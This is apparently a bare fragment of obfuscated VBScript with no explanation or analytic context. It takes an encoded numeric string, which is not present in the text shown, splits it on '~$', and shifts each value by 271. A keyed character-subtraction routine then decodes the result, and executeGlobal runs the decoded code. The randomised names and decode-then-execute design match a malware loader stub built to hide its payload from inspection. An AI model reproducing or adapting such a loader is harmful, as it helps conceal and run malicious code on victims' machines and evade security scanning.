dim cSKXXgIVMV
cSKXXgIVMV = "~$"
QZuuGbFxIomhnGQuljhjFIdPKZ = SPLIT(QZuuGbFxIomhnGQuljhjFIdPKZ, cSKXXgIVMV)
dim KuGGlkjNuDICyX
KuGGlkjNuDICyX = 0
dim XlHwekhcdexROBekE
XlHwekhcdexROBekE = UBOUND(QZuuGbFxIomhnGQuljhjFIdPKZ) - 1
FOR qbdSbboTULPSDdZx = KuGGlkjNuDICyX TO XlHwekhcdexROBekE
dim ZZmbyWsgxexTPMzCIWN
dim vnlDxmCeKPlRLsIXpjxvTzW
dim ZMlPePmmBUNjbLspcnSMDBI
ZMlPePmmBUNjbLspcnSMDBI = "2Hqxw0zshYEDfQs1Ba7WW1X"
vnlDxmCeKPlRLsIXpjxvTzW = QZuuGbFxIomhnGQuljhjFIdPKZ(qbdSbboTULPSDdZx)
ZZmbyWsgxexTPMzCIWN = HvOucCOvRCelAmAub(CHRW(vnlDxmCeKPlRLsIXpjxvTzW - 271) ,ZMlPePmmBUNjbLspcnSMDBI)
PqfYudqITfhJfYDTHiBsLzGRRahGo = PqfYudqITfhJfYDTHiBsLzGRRahGo & ZZmbyWsgxexTPMzCIWN
NEXT
executeGlobal (PqfYudqITfhJfYDTHiBsLzGRRahGo)
Function HvOucCOvRCelAmAub(nXkFlRniBlDTiiNIXGiheRtkn,ZMlPePmmBUNjbLspcnSMDBI)
Dim kNGUvjTesJZamlgZ, QorQYEJDcXHKVezRVhZchp, AEpDiwTwBFkdvvzLJ, QUMMUWfZIQEGxzaVrMiAaGHaGElB, WVVPeQVHojT
WVVPeQVHojT = ""
kNGUvjTesJZamlgZ = Len(ZMlPePmmBUNjbLspcnSMDBI)
QorQYEJDcXHKVezRVhZchp = 1
AEpDiwTwBFkdvvzLJ = Len(nXkFlRniBlDTiiNIXGiheRtkn)
nXkFlRniBlDTiiNIXGiheRtkn = StrReverse(nXkFlRniBlDTiiNIXGiheRtkn)
For QUMMUWfZIQEGxzaVrMiAaGHaGElB = AEpDiwTwBFkdvvzLJ To 1 Step - 1
WVVPeQVHojT = WVVPeQVHojT & chrw(ascw(Mid(nXkFlRniBlDTiiNIXGiheRtkn,QUMMUWfZIQEGxzaVrMiAaGHaGElB,1)) - Ascw(Mid(ZMlPePmmBUNjbLspcnSMDBI,QorQYEJDcXHKVezRVhZchp,1)))
QorQYEJDcXHKVezRVhZchp = QorQYEJDcXHKVezRVhZchp+1
If QorQYEJDcXHKVezRVhZchp > kNGUvjTesJZamlgZ Then QorQYEJDcXHKVezRVhZchp = 1
Next
WVVPeQVHojT=StrReverse(WVVPeQVHojT)
HvOucCOvRCelAmAub = WVVPeQVHojT
End Function
